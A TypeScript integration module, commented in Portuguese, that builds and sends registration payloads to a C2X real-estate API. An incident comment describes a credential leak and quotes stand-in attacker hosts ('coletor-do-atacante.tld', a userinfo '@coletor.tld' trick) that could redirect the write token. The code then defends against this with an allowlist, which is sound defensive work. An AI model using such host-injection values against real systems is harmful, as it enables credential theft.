// ESCRITA Apolo -> C2X pelo ENDPOINT OFICIAL DA INTEGRAÇÃO (contrato de 22/jul/2026).
//
// Por que este módulo existe, ao lado de c2x-write.ts: em 28/jul construímos contra
// `POST /api/v1/users` — o endpoint GENÉRICO do Rails, mapeado por engenharia reversa do banco.
// Ele funciona, mas é o caminho errado: devolve `token` (não o id), responde 201 até no erro,
// exige `password`, e o vínculo com a imobiliária pede o ID dela no C2X (que temos de caçar por
// CNPJ no banco antes de cada envio).
//
// O endpoint DEDICADO, que o time do C2X entregou no contrato, resolve tudo isso:
//   POST {base}/api/v1/integrations/panteon/users          -> cria   (409 se o documento já existe)
//   PUT  {base}/api/v1/integrations/panteon/users/:doc      -> atualiza (404 se não existe)
//   sucesso: { status, id, user_code, created }  <- devolve o ID DO C2X
//   erro:    422 { status, errors, errors_message }  — e NADA é criado
//
// Provado em produção (31/jul, sonda com corpo vazio): a chave é aceita e a API respondeu
// 422 `{"profile":["perfil invalido ou ausente"]}` — o campo `profile` do contrato, texto.
//
// Diferenças de formato que este módulo implementa (e o antigo não tinha):
//   profile: "cliente"           (texto)      em vez de profile_id: 2
//   person_type: "fisica"        (texto)      em vez de person_type_id: 1
//   vinculed_by_document: "CNPJ" (documento)  em vez de vinculed_by_id: <id no C2X>
//   address: {...}               (objeto)     em vez de addresses_attributes: [...]
//   phones: [...]                             em vez de phones_attributes: [...]
//   SEM password  ·  SEM user_status_id (a API já cria como Aprovado)
import {
  C2X_ESCOLARIDADE,
  C2X_FAIXA_RENDA,
  matchEstadoCivilId,
  matchRegimeBensId,
  matchSexoId,
} from "./c2x-fields";
import {
  matchEscolaridadeId,
  matchFaixaRendaId,
  matchProfissaoId,
} from "./c2x-match";
import type { ApoloC2xCadastro } from "./types";

// ── TIPOS ─────────────────────────────────────────────────────────────────

export type PerfilIntegracao =
  | "cliente"
  | "corretor"
  | "imobiliaria"
  | "incorporador";

export type EnderecoIntegracao = {
  address: string | null;
  cityId: number | null;
  complement: string | null;
  district: string | null;
  number: string | null;
  stateId: number | null;
  zipcode: string | null;
};

// Os domínios JÁ COMO ID, do jeito que o cadastro do Apolo guarda (`estadoCivilId`, `rendaId`...).
//
// Por que isto existe: o caminho antigo fazia a viagem id -> RÓTULO -> id (o servidor traduzia o id
// para texto ao montar o ApoloC2xCadastro, e a montagem do payload traduzia de volta). A volta é
// lossy — provado em c2x-roundtrip.test.ts: o sexo "Não quero informar" (id 3) some, porque o
// matcher só entende M/F. Recebendo o id direto, o dado não passa por tradução nenhuma.
export type IdsDoCadastro = {
  civilStateId?: number | null;
  professionId?: number | null;
  propertyRegimeId?: number | null;
  salaryRangeId?: number | null;
  schoolingId?: number | null;
  sexId?: number | null;
};

export type DadosIntegracao = {
  cadastro: ApoloC2xCadastro;
  email: string | null;
  endereco?: EnderecoIntegracao | null;
  // Empreendimento do vínculo. Sem ele o cliente NÃO fica visível para o corretor/imobiliária e
  // não anda no fluxo comercial (o contrato é explícito nisso).
  enterpriseId?: number | null;
  // Preferidos quando vierem: evitam a tradução (ver IdsDoCadastro). Sem eles, cai no rótulo.
  ids?: IdsDoCadastro;
  nome: string;
  telefone: string | null;
  // Documento (CNPJ da imobiliária ou CPF do corretor) que capta o cliente.
  vinculedByDocument?: string | null;
};

// Número válido ou null — o id do domínio nunca pode ir como 0/NaN/"".
function num(v: unknown): number | null {
  if (v === null || v === undefined || v === "") return null;
  const n = Number(v);
  return Number.isFinite(n) && n > 0 ? n : null;
}

export type PayloadIntegracao = Record<string, unknown>;

// ── UTILIDADES ────────────────────────────────────────────────────────────

export function soDigitos(valor: string | null | undefined): string {
  return String(valor ?? "").replace(/\D/g, "");
}

// A API aceita o documento com ou sem máscara; mandamos SÓ DÍGITOS por ser o formato que não
// depende de como o dado foi digitado no Apolo.
function doc(valor: string | null | undefined): string | null {
  return soDigitos(valor) || null;
}

function dataIso(valor: string | null | undefined): string | null {
  if (!valor) return null;
  const br = valor.match(/^(\d{2})\/(\d{2})\/(\d{4})$/);
  if (br) return `${br[3]}-${br[2]}-${br[1]}`;
  const iso = valor.match(/^\d{4}-\d{2}-\d{2}/);
  return iso ? valor.slice(0, 10) : null;
}

// Fora do JSON o que não tem valor: a API trata presença como intenção, e mandar `null` num campo
// opcional vira erro de validação à toa.
function limpar(obj: Record<string, unknown>): PayloadIntegracao {
  const saida: Record<string, unknown> = {};
  for (const [k, v] of Object.entries(obj)) {
    if (v === null || v === undefined || v === "") continue;
    if (Array.isArray(v) && v.length === 0) continue;
    if (typeof v === "object" && !Array.isArray(v) && Object.keys(v).length === 0) continue;
    saida[k] = v;
  }
  return saida;
}

// Estado civil que EXIGE regime de bens (casado / união estável). Foi o erro que barrou o
// JOSE RENATO no teste de 28/jul.
const EXIGE_REGIME = new Set([2, 6]);

// Documento: no C2X é sempre CPF (decisão do Lucas 28/jul — não capturamos RG, então o número de
// identificação repete o CPF).
const DOC_TYPE_CPF = 2;

// O cadastro do Apolo guarda ROTULO ("Casado", "Superior completo"), não o id do C2X. A tradução é
// a mesma do caminho antigo (c2x-write.ts) — mudou o envelope do payload, não o de-para dos
// domínios. Quando o rótulo não casa, o campo fica FORA: melhor ausente do que errado, porque
// profissão e renda entram na análise de crédito.
function idPorRotulo(
  lista: { id: number; label: string }[],
  valor: string | null | undefined,
): number | null {
  if (!valor) return null;
  const norm = (s: string) =>
    s.normalize("NFD").replace(/[̀-ͯ]/g, "").toLowerCase().trim();
  const alvo = norm(String(valor));
  return lista.find((o) => norm(o.label) === alvo)?.id ?? null;
}

function endereco(e: EnderecoIntegracao | null | undefined): PayloadIntegracao | null {
  if (!e || !e.address) return null;
  const montado = limpar({
    address: e.address,
    city_id: e.cityId,
    complement: e.complement,
    district: e.district,
    number: e.number,
    state_id: e.stateId,
    zipcode: soDigitos(e.zipcode) || null,
  });
  return Object.keys(montado).length ? montado : null;
}

// O contrato usa `phones: [{ phone, phone_type_id, is_whatsapp }]`. O DDI não é campo aqui (ao
// contrário do endpoint genérico, que separava phone_code): mandamos o número nacional.
function telefones(telefone: string | null): PayloadIntegracao[] {
  const numero = soDigitos(telefone).replace(/^55(?=\d{10,11}$)/, "");
  if (numero.length < 10) return [];
  return [{ is_whatsapp: true, phone: numero }];
}

// ── MONTAGEM DOS PAYLOADS ─────────────────────────────────────────────────

export function montarClienteIntegracao(d: DadosIntegracao): PayloadIntegracao {
  const c = d.cadastro;
  const cpf = doc(c.cpf);
  // O id do cadastro MANDA; o rótulo é só a rede de segurança para fichas antigas.
  const civil = num(d.ids?.civilStateId) ?? matchEstadoCivilId(c.civilState ?? "");

  return limpar({
    profile: "cliente",
    person_type: "fisica",

    name: d.nome,
    email: d.email,
    cpf,
    document_type_id: DOC_TYPE_CPF,
    identification_number: cpf,
    birthday: dataIso(c.birthday),

    civil_state_id: civil,
    // Só quando casado/união estável — mandar em solteiro é recusado.
    property_regime_id:
      civil !== null && EXIGE_REGIME.has(Number(civil))
        ? (num(d.ids?.propertyRegimeId) ??
          Number(matchRegimeBensId(c.propertyRegime ?? "")) ??
          null)
        : null,
    sex_id: num(d.ids?.sexId) ?? matchSexoId(c.sex ?? ""),
    schooling_id:
      num(d.ids?.schoolingId) ??
      matchEscolaridadeId(c.schooling) ??
      idPorRotulo(C2X_ESCOLARIDADE, c.schooling),
    profession_id: num(d.ids?.professionId) ?? matchProfissaoId(c.profession),
    salary_range_id:
      num(d.ids?.salaryRangeId) ??
      matchFaixaRendaId(c.salaryRange) ??
      idPorRotulo(C2X_FAIXA_RENDA, c.salaryRange),
    naturalness: c.naturalness,
    nacionality: c.nacionality, // (sic — a API escreve com um "c" só)
    mother_name: c.motherName,

    // O par que dá visibilidade comercial ao cliente.
    vinculed_by_document: doc(d.vinculedByDocument),
    enterprise_id: d.enterpriseId ?? null,

    address: endereco(d.endereco),
    phones: telefones(d.telefone),
  });
}

export function montarImobiliariaIntegracao(d: DadosIntegracao): PayloadIntegracao {
  const c = d.cadastro;
  return limpar({
    profile: "imobiliaria",
    person_type: "juridica",

    name: d.nome, // a API aceita name; fantasy/social são os que valem para PJ
    email: d.email,
    cnpj: doc(c.cnpj),
    fantasy_name: c.fantasyName ?? d.nome,
    social_name: c.socialName ?? d.nome,
    user_nire: c.nire,
    municipal_inscription: c.municipalInscription,
    // company_size_id (porte) é opcional no contrato e NÃO existe no cadastro do Apolo — fica fora
    // em vez de ir com palpite.
    open_company_date: dataIso(c.openCompanyDate),
    phone: soDigitos(d.telefone) || null,

    address: endereco(d.endereco),
  });
}

export function montarIncorporadorIntegracao(d: DadosIntegracao): PayloadIntegracao {
  const c = d.cadastro;
  return limpar({
    profile: "incorporador",
    person_type: "juridica",

    name: d.nome,
    email: d.email,
    cnpj: doc(c.cnpj),
    fantasy_name: c.fantasyName ?? d.nome,
    social_name: c.socialName ?? d.nome,
    user_nire: c.nire,
    municipal_inscription: c.municipalInscription,
    // company_size_id (porte) é opcional no contrato e NÃO existe no cadastro do Apolo — fica fora
    // em vez de ir com palpite.
    open_company_date: dataIso(c.openCompanyDate),
    phone: soDigitos(d.telefone) || null,

    address: endereco(d.endereco),
  });
}

export function montarPayloadIntegracao(
  perfil: PerfilIntegracao,
  d: DadosIntegracao,
): PayloadIntegracao {
  if (perfil === "cliente") return montarClienteIntegracao(d);
  if (perfil === "imobiliaria") return montarImobiliariaIntegracao(d);
  if (perfil === "incorporador") return montarIncorporadorIntegracao(d);
  throw new Error(`Perfil sem montagem na integração: ${perfil}`);
}

// O documento que identifica a pessoa na API (CPF p/ PF, CNPJ p/ PJ) — é a chave do PUT e o que
// faz o POST devolver 409 em vez de duplicar.
export function documentoDaIntegracao(cadastro: ApoloC2xCadastro): string {
  return soDigitos(cadastro.cnpj) || soDigitos(cadastro.cpf);
}

// ── TRANSPORTE ────────────────────────────────────────────────────────────

export type RespostaIntegracao =
  | {
      c2xId: number | null;
      criado: boolean;
      http: number;
      ms: number;
      status: "sucesso";
      userCode: string | null;
    }
  | {
      erros: Record<string, string[]>;
      http: number;
      mensagem: string;
      ms: number;
      status: "duplicado" | "nao_encontrado" | "sem_autorizacao" | "validacao";
    }
  | { detalhe: string; ms: number; status: "erro_transporte" };

type Config = { base: string; token: string };

export function configIntegracao(): Config | null {
  const base = process.env.C2X_WRITE_API_URL?.trim();
  const token = process.env.C2X_WRITE_API_TOKEN?.trim();
  if (!base || !token) return null;
  return { base: base.replace(/\/+$/, ""), token };
}

export const CAMINHO_INTEGRACAO = "/api/v1/integrations/panteon/users";

// ── PARA ONDE O TOKEN PODE SER MANDADO (sondas de diagnóstico) ────────────
//
// INCIDENTE (05/08/2026) — VAZAMENTO DE CREDENCIAL. As sondas de diagnóstico aceitavam um campo
// `host` vindo do CORPO da requisição e usavam esse texto como destino do fetch que leva o TOKEN
// DE ESCRITA do C2X nos headers (`access_token` e `Authorization`). Ou seja: qualquer um com
// sessão admin, ou um XSS na área logada, mandava {"host":"https://coletor-do-atacante.tld"} e
// recebia a credencial de produção. O mesmo buraco desviava a criação de cadastro para o ambiente
// de teste, passando por cima da env de produção.
//
// Regra desde então: o destino sai da env (C2X_WRITE_API_URL). O corpo só pode PEDIR um dos hosts
// conhecidos escritos aqui, porque o diagnóstico precisa comparar produção com teste. Host fora
// desta lista NÃO recebe fetch nenhum, e o token não sai daqui. NÃO transforme isto em env nem em
// parâmetro livre.
export const HOSTS_C2X_PERMITIDOS = [
  "https://sistema.careli.adm.br", // produção
  "https://teste.careli.adm.br", // teste
] as const;

export function resolverHostSonda(
  hostPedido: string | null | undefined,
  baseDaEnv: string,
): { base: string; ok: true } | { erro: string; ok: false } {
  const pedido = String(hostPedido ?? "")
    .trim()
    .replace(/\/+$/, "");
  // Sem pedido: vale a env, que é a fonte de verdade.
  if (!pedido) return { base: baseDaEnv.replace(/\/+$/, ""), ok: true };

  const permitido = HOSTS_C2X_PERMITIDOS.find((conhecido) => {
    try {
      return new URL(conhecido).host === new URL(pedido).host;
    } catch {
      return false;
    }
  });
  if (!permitido) {
    return {
      erro: `Host não permitido para a sonda: use ${HOSTS_C2X_PERMITIDOS.join(" ou ")}, ou deixe em branco para usar o configurado.`,
      ok: false,
    };
  }
  // Devolve o host DA LISTA, nunca o texto que veio no corpo: assim usuário/senha embutidos
  // ("https://sistema.careli.adm.br@coletor.tld"), porta trocada ou http:// não viajam junto.
  return { base: permitido, ok: true };
}

// Traduz a resposta para algo que quem chama consegue decidir em cima. O contrato é honesto no
// código HTTP (ao contrário do endpoint genérico, que responde 201 até no erro), então aqui o
// status HTTP MANDA.
export function interpretarIntegracao(
  http: number,
  corpo: unknown,
  ms: number,
): RespostaIntegracao {
  const c = (corpo ?? {}) as Record<string, unknown>;

  if (http === 200 || http === 201) {
    const id = typeof c.id === "number" ? c.id : Number(c.id);
    return {
      c2xId: Number.isFinite(id) ? id : null,
      criado: c.created === true || http === 201,
      http,
      ms,
      status: "sucesso",
      userCode: typeof c.user_code === "string" ? c.user_code : null,
    };
  }

  const erros = (c.errors ?? {}) as Record<string, string[]>;
  const mensagem =
    typeof c.errors_message === "string"
      ? c.errors_message
      : typeof c.message === "string"
        ? c.message
        : `HTTP ${http}`;

  if (http === 401) return { erros, http, mensagem, ms, status: "sem_autorizacao" };
  if (http === 404) return { erros, http, mensagem, ms, status: "nao_encontrado" };
  if (http === 409) return { erros, http, mensagem, ms, status: "duplicado" };
  return { erros, http, mensagem, ms, status: "validacao" };
}

async function chamar(
  url: string,
  metodo: "POST" | "PUT",
  payload: PayloadIntegracao,
  cfg: Config,
  timeoutMs = 30_000,
): Promise<RespostaIntegracao> {
  const inicio = Date.now();
  const abort = new AbortController();
  const t = setTimeout(() => abort.abort(), timeoutMs);
  try {
    const resp = await fetch(url, {
      body: JSON.stringify(payload),
      cache: "no-store",
      headers: {
        Accept: "application/json",
        // A devolutiva de 27/jul trocou `access_token` por `Authorization`. Mandamos os dois: o
        // que a API não usar é ignorado, e assim não quebramos se ela voltar atrás.
        access_token: cfg.token,
        Authorization: cfg.token,
        "Content-Type": "application/json",
      },
      method: metodo,
      signal: abort.signal,
    });
    const texto = await resp.text();
    const ms = Date.now() - inicio;
    let corpo: unknown = {};
    try {
      corpo = texto ? JSON.parse(texto) : {};
    } catch {
      return {
        detalhe: `Resposta não-JSON (HTTP ${resp.status}): ${texto.slice(0, 200)}`,
        ms,
        status: "erro_transporte",
      };
    }
    return interpretarIntegracao(resp.status, corpo, ms);
  } catch (erro) {
    return {
      detalhe: erro instanceof Error ? erro.message : String(erro),
      ms: Date.now() - inicio,
      status: "erro_transporte",
    };
  } finally {
    clearTimeout(t);
  }
}

// CRIA. 409 = o documento já existe (não é falha: é a idempotência da API).
export async function criarNaIntegracao(
  payload: PayloadIntegracao,
): Promise<RespostaIntegracao> {
  const cfg = configIntegracao();
  if (!cfg) {
    return {
      detalhe: "C2X_WRITE_API_URL/C2X_WRITE_API_TOKEN não configuradas.",
      ms: 0,
      status: "erro_transporte",
    };
  }
  return chamar(`${cfg.base}${CAMINHO_INTEGRACAO}`, "POST", payload, cfg);
}

// ATUALIZA pelo documento. 404 = não existe lá ainda (quem chama decide criar).
export async function atualizarNaIntegracao(
  documento: string,
  payload: PayloadIntegracao,
): Promise<RespostaIntegracao> {
  const cfg = configIntegracao();
  if (!cfg) {
    return {
      detalhe: "C2X_WRITE_API_URL/C2X_WRITE_API_TOKEN não configuradas.",
      ms: 0,
      status: "erro_transporte",
    };
  }
  const d = soDigitos(documento);
  return chamar(
    `${cfg.base}${CAMINHO_INTEGRACAO}/${encodeURIComponent(d)}`,
    "PUT",
    payload,
    cfg,
  );
}

// CRIA OU ATUALIZA: tenta criar; se a pessoa já existe (409), atualiza. É o que torna o reenvio
// seguro — inclusive para quem já estava no C2X antes da integração.
export async function salvarNaIntegracao(
  documento: string,
  payload: PayloadIntegracao,
): Promise<{ resposta: RespostaIntegracao; viaPut: boolean }> {
  const criado = await criarNaIntegracao(payload);
  if (criado.status !== "duplicado") return { resposta: criado, viaPut: false };
  const atualizado = await atualizarNaIntegracao(documento, payload);
  return { resposta: atualizado, viaPut: true };
}
